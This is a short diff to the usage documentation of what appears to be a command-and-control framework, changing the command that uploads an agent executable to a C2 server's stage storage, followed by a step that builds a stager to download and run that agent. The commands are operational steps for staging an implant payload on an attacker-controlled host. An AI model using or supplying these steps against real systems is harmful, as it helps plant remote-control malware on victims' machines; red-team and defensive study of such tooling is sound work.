@@ -43,10 +43,9 @@ A tiny binary that downloads and executes the full agent from the C2 stage endpo
 
 ```bash
 # 1. Upload the full agent to the server's stage storage
-./bin/taburtuai-generate upload \
+./bin/taburtuai-generate upload ./output/agent.exe \
   --server http://192.168.1.10:8080 \
-  --file ./output/agent.exe \
-  --name agent_v2
+  --desc "agent_v2"
 
 # 2. Build a stager that downloads from the server
 ./bin/taburtuai-generate stager \
